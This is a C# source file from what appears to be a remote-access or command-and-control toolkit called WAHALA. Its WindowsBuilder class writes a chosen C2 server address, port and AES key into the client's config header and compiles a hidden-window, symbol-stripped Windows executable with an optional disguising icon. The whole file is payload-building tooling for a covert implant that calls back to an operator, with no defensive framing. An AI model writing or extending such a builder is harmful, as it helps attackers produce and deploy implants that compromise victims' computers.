using System;
using System.IO;

namespace WAHALA.Server.Core
{
    public class WindowsBuilder
    {
        public static void Build(string outputExePath, string c2Server, int c2Port, string aesKeyBase64, string iconPath = null)
        {
            string tempDir = Path.Combine(Path.GetTempPath(), "wahala_win_build_" + Guid.NewGuid().ToString("N"));
            Directory.CreateDirectory(tempDir);

            // Copy client source (assumes source is in a folder called "ClientSource" next to server exe)
            string sourceDir = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "ClientSource");
            if (!Directory.Exists(sourceDir))
                throw new DirectoryNotFoundException("Client source not found. Place the Windows client source in 'ClientSource' folder.");

            foreach (var file in Directory.GetFiles(sourceDir, "*", SearchOption.AllDirectories))
            {
                string rel = Path.GetRelativePath(sourceDir, file);
                string dest = Path.Combine(tempDir, rel);
                Directory.CreateDirectory(Path.GetDirectoryName(dest));
                File.Copy(file, dest, true);
            }

            // Patch Config.h
            string configPath = Path.Combine(tempDir, "Config.h");
            string configContent = File.ReadAllText(configPath);
            configContent = configContent.Replace("\"127.0.0.1\"", $"\"{c2Server}\"");
            configContent = configContent.Replace("4444", c2Port.ToString());
            configContent = configContent.Replace("\"YOUR_32_BYTE_BASE64_KEY_HERE\"", $"\"{aesKeyBase64}\"");
            File.WriteAllText(configPath, configContent);

            // Build command
            string args = "-o \"" + outputExePath + "\" ";
            args += "src/*.cpp ";
            if (iconPath != null && File.Exists(iconPath))
                args += $"\"{iconPath}\" ";
            args += "-lws2_32 -lbcrypt -lcrypt32 -mwindows -s -O2";

            ProcessRunner.Run("x86_64-w64-mingw32-g++", args, tempDir);

            // Cleanup
            Directory.Delete(tempDir, true);
        }
    }
}
